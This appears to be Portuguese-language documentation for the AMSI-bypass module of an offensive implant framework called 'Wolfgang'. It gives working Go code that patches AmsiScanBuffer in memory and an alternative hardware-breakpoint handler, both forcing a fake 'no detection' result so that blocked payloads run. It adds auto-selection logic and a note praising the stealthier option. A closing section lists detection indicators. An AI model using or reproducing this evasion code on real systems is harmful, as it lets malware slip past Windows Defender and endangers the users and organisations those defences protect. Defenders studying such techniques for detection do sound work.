    AMSI Bypass¶

    O que é¶

    AMSI (Antimalware Scan Interface) é uma API do Windows que permite que antivírus inspecionem conteúdo dinâmico antes da execução. Quando o PowerShell, .NET CLR, VBScript ou JScript executam código, chamam AmsiScanBuffer para submeter o conteúdo ao provider de segurança registrado (geralmente o Windows Defender).

    O AMSI bypass do Wolfgang faz com que AmsiScanBuffer retorne imediatamente sem realizar o scan, permitindo a execução de payloads que seriam bloqueados.

    Por que funciona¶

    A arquitetura AMSI é baseada em uma cadeia de chamadas em userland:

    1. O host (PowerShell, CLR) carrega amsi.dll no processo
    2. Chama AmsiInitialize para criar um contexto AMSI
    3. Para cada conteúdo a ser executado, chama AmsiScanBuffer
    4. AmsiScanBuffer repassa o buffer para o provider registrado via COM
    5. O provider retorna AMSI_RESULT_CLEAN, AMSI_RESULT_DETECTED, etc.

    Como amsi.dll é carregada no espaço de endereçamento do processo do implant, é possível modificar a função AmsiScanBuffer diretamente na memória. A chave é que toda a cadeia roda em userland -- não há validação kernel-side do resultado.

    O bypass funciona porque o código que consome o resultado de AmsiScanBuffer trata o retorno E_INVALIDARG (0x80070057) como "nenhuma detecção" -- a função falhou, então não há scan result negativo para bloquear a execução.

    Implementação no Wolfgang¶

    O Wolfgang suporta duas estratégias de bypass, selecionáveis via argumento strategy:

    Strategy: Memory Patching¶

    Sobrescreve os primeiros bytes de AmsiScanBuffer com instruções que forçam o retorno de E_INVALIDARG:

    // x86_64: mov eax, 0x80070057; ret
amsiPatch := []byte{0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3}

original, err := a.patchFunc("amsi.dll", "AmsiScanBuffer", amsiPatch)

    O processo de patching em amsi_windows.go:

    func platformPatchMemory(moduleName, procName string, patch []byte) ([]byte, error) {
    // 1. Resolve o handle do módulo
    hModule, _, _ := procGetModuleHandleA.Call(uintptr(unsafe.Pointer(modBytes)))

    // 2. Localiza o endereço da função
    procAddr, _, _ := procGetProcAddress.Call(hModule, uintptr(unsafe.Pointer(procBytes)))

    // 3. Salva os bytes originais
    original := make([]byte, len(patch))
    for i := range original {
        original[i] = *(*byte)(unsafe.Pointer(procAddr + uintptr(i)))
    }

    // 4. Altera proteção para PAGE_READWRITE
    procVirtualProtect.Call(procAddr, uintptr(len(patch)),
        uintptr(winapi.PageReadWrite), uintptr(unsafe.Pointer(&oldProtect)))

    // 5. Escreve os bytes do patch
    for i, b := range patch {
        *(*byte)(unsafe.Pointer(procAddr + uintptr(i))) = b
    }

    // 6. Restaura proteção original
    procVirtualProtect.Call(procAddr, uintptr(len(patch)),
        uintptr(oldProtect), uintptr(unsafe.Pointer(&oldProtect)))

    return original, nil
}

    Strategy: Hardware Breakpoints (HWBP)¶

    Usa debug registers do processador para interceptar a chamada sem modificar memória:

    func AMSIHandler(ei *ExceptionInfo) {
    ei.SetRax(0x80070057) // E_INVALIDARG
    ei.SkipFunction()     // seta RIP para return address, ajusta RSP
}

func InstallAMSIBypass(m *Manager) (int, error) {
    addr, _ := ResolveFunction("amsi.dll", "AmsiScanBuffer")
    return m.SetBreakpoint(addr, AMSIHandler)
}

    Seleção automática¶

    O modo auto (padrão) tenta HWBP primeiro e faz fallback para patching:

    func (a *AMSIBypass) applyBypass(strategy string) (module.ModuleResult, error) {
    switch strategy {
    case "auto":
        result, err := a.executeHWBP()
        if err != nil {
            return a.patch()  // fallback
        }
        return result, nil
    }
}

    Fluxo Normal (sem bypass)¶

    participant IMP as Implant
    participant AMSI as amsi.dll
    participant PS as PowerShell
    participant AV as Defender

    IMP->>AMSI: VirtualProtect(RW)
    IMP->>AMSI: Patch AmsiScanBuffer

    PS->>AMSI: AmsiScanBuffer(script)
    Note over AMSI: Executa patch:
    retorna E_INVALIDARG

    Note over PS: Trata como "sem detecção"
    PS->>PS: Script executa normalmente
    Note over AV: Nunca é chamado

    Fluxo com Hardware Breakpoint¶

    sequenceDiagram
    participant IMP as Implant
    participant CPU as CPU/DR0
    participant VEH as VEH Handler
    participant AMSI as amsi.dll

    IMP->>CPU: SetThreadContext
    (DR0 = &AmsiScanBuffer)
    IMP->>IMP: AddVectoredExceptionHandler

    Note over AMSI: Caller chama AmsiScanBuffer
    CPU->>CPU: Instruction pointer == DR0
    CPU->>VEH: EXCEPTION_SINGLE_STEP
    VEH->>VEH: RAX = 0x80070057
    VEH->>VEH: RIP = [RSP] (return addr)
    VEH->>VEH: RSP += 8
    VEH-->>AMSI: EXCEPTION_CONTINUE_EXECUTION
    Note over AMSI: Retorna E_INVALIDARG
    sem executar nenhum byte

    Detecção¶

    Indicadores de Memory Patching¶

    IOC Descrição
    VirtualProtect em amsi.dll Alteração de permissões de memória da DLL
    Primeiros bytes de AmsiScanBuffer modificados Integrity check do prologue da função
    PAGE_READWRITE em .text section de amsi.dll Seção de código com permissão de escrita

    EDRs modernos monitoram:

    • Integrity checks: Comparam o prologue de AmsiScanBuffer com a versão em disco
    • VirtualProtect hooks: Detectam tentativas de tornar seções de código graváveis
    • ETW AmsiScanBuffer events: Eventos de telemetria da própria AMSI

    Indicadores de HWBP¶

    Hardware breakpoints são significativamente mais difíceis de detectar:

    • Não modificam memória -- integrity checks passam
    • Operam via registros de debug da CPU, não via hooks
    • Detecção requer GetThreadContext para inspecionar DR0-DR3
    • Alguns EDRs monitoram SetThreadContext para detectar a configuração

    Evasão de detecção¶

    A estratégia auto do Wolfgang prioriza HWBP justamente porque é mais furtiva. O fallback para patching só ocorre se HWBP falhar (ex: todos os 4 debug registers já estão em uso).
